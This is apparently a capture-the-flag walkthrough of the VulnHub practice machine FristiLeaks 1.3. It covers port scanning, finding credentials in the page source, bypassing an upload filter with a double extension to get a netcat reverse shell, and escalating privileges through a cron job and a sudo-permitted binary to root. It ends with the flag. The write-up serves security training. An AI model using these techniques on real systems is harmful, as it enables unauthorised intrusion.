---
title: FristiLeaks 1.3
categories: [Vulnhub]
tags: [boot2root]
---

# Machine Information

- [FristiLeaks 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)
- Author: `Ar0xA`

## Host discovery

Since IP address is not given, I used `nmap` to scan for my network and found the target IP.

- target IP: `192.168.188.138`

## Information Gathering

I always started out with nmap

```bash
Nmap scan report for 192.168.188.138
Host is up (0.0011s latency).
Not shown: 65397 filtered tcp ports (no-response), 137 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|media device|webcam
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Drobo embedded (89%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:drobo:5n cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.13 ms 192.168.188.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.65 seconds
```

Based on the result, port 80 is the only port that opened.

## Exploiting Port 80

Based on the nmap result, it managed to get `robots.txt` from the website. I started out with searching for useful information and reconfirm the `robots.txt`.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-14-57-32.png)

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-14-57-56.png)

The main page seems to be nothing interesting while the `robots.txt` is valid and disallow 3 subdirectories. I then look into it one by one. 

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-02-27.png)

After looking into all 3 subdirectories, it just provide me a meme which is a rabbit hole. Since it is a rabbit hole, the next thing that I could only do is brute force directory. After running automated tools such as `gobuster`, the results was not helpful. I then realize that all the subdirectories given in `robots.txt` is a drink and the homepage motto is about drinking fristi. I then tried my luck with `fristi` and I managed to get into another page.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-13-14.png)

Since it's a login page, lets try out the common methods. After trying for several methods, the credentials was stored by the developer in the html source code. 

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-27-33.png)

It stated that the password is saved as a image and base64 encoded and saved in somewhere in the html. After looking for awhile, I noticed a html comment where the information looks exactly like a base64 encoded message.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-29-21.png)

I then decode it with cyberchef and got the image information which is the password.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-30-46.png)

After getting the password, I managed to login with the username and the password that both found in the source code. 

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-31-46.png)

It appears that this is a file upload page. This might be the way for me to get my reverse shell. 

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-32-45.png)

Based on the file upload page, it seems that it only allows image files. I then try to upload malicious files instead of just image files.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-15-41-43.png)

It seems that if only allow the mentioned extensions. I then try some simple bypassing techniques 

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-20-47-00.png)

After trying out a few methods, I managed to execute command by uploading a php file but ending with png extension. Although it is ending with png which is a png extension, I am still able to perform command injection.

![](/assets/img/posts/2024-01-26-FristiLeaks-1.3/2024-01-26-FristiLeaks-1.3-20-48-45.png)

With that POC, I could just upload a php reverse shell and get a reverse shell in my own terminal.

```bash
nc -nvlp 1234                                                                        
listening on [any] 1234 ...
connect to [192.168.188.128] from (UNKNOWN) [192.168.188.138] 33220
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 07:51:00 up  6:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ whoami
whoami
apache
```

After that, I tried to spawn a fully interactive shell before proceeding to privilege escalation.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
[ctrl] + [z]
stty raw -echo;fg
```

## Privilege Escalation

After getting the reverse shell, I started out by wandering around. I noticed that there's a note which might be useful for the next step.

```bash
bash-4.1$ cat notes.txt 
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

Based on the note, this should be some kind of cronjob where I put some commands in `/tmp/runthis` file and the result will be in `/tmp/cronresult`. Since I do not understand a lot of stuff, I tried to access `/home/admin` directory first by running `chmod` command

```bash
bash-4.1$ cat /tmp/runthis 
/home/admin/chmod -R 777 /home/admin
bash-4.1$ ls -la /home
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 Jan 26 01:48 ..
drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod
```

Now that I have access to admin directory, I started looking around for something useful.

```bash
bash-4.1$ ls -la
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
-rwxrwxrwx. 1 admin     admin         18 Sep 22  2015 .bash_logout
-rwxrwxrwx. 1 admin     admin        176 Sep 22  2015 .bash_profile
-rwxrwxrwx. 1 admin     admin        124 Sep 22  2015 .bashrc
-rwxrwxrwx  1 admin     admin      45224 Nov 18  2015 cat
-rwxrwxrwx  1 admin     admin      48712 Nov 18  2015 chmod
-rwxrwxrwx  1 admin     admin        737 Nov 18  2015 cronjob.py
-rwxrwxrwx  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rwxrwxrwx  1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxrwxrwx  1 admin     admin      90544 Nov 18  2015 df
-rwxrwxrwx  1 admin     admin      24136 Nov 18  2015 echo
-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 egrep
-rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 grep
-rwxrwxrwx  1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
```

Based on the result, there are some useful files. After investigating one by one, It seems that the `cryptpass.py` is encrypting some password. I then tried to decrypted it based on the python code.

```py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

```bash
bash-4.1$ cat cryptedpass.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d   
thisisalsopw123
bash-4.1$ cat whoisyourgodnow.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d
LetThereBeFristi!
```

The python code basically base64 encode the password, reverse it and perform ROT13. We could decode it by just performing rot 13 (which is the `tr` command), reverse it (`rev` command) and base64 decode it (`base64 -d`). With that, I managed to get 2 different password which one should be a sameple password while the other one is the password for fristigod since the file owner is fristigod. With that, I tried to escalate to user fristigod.

```bash
bash-4.1$ su fristigod
Password: LetThereBeFristi!
bash-4.1$ whoami
fristigod
```

I managed to escalate to user fristigod with the credentials. I started out by checking `sudo -l` since I have password.

```bash
bash-4.1$ sudo -l 
[sudo] password for fristigod: 
Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

I was given a weird command where I have no idea what is that. After trying out, I noticed that it allows me to run some comand.

```bash
bash-4.1$ sudo /var/fristigod/.secret_admin_stuff/doCom
Sorry, user fristigod is not allowed to execute '/var/fristigod/.secret_admin_stuff/doCom' as root on localhost.localdomain.
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
Usage: ./program_name terminal_command ...
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /usr/bin/id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

With that, I could just run `/bin/bash` command and get root shell. 

```bash
bash-4.1# whoami && id
root
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
bash-4.1# cat fristileaks_secrets.txt 
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1

```

## Things I learned from the machine

- executing php with `.php.jpg` extension is something weird. (I still dont understand after asking chatgpt)
- remember to check the user that can be executed based on the sudo permission.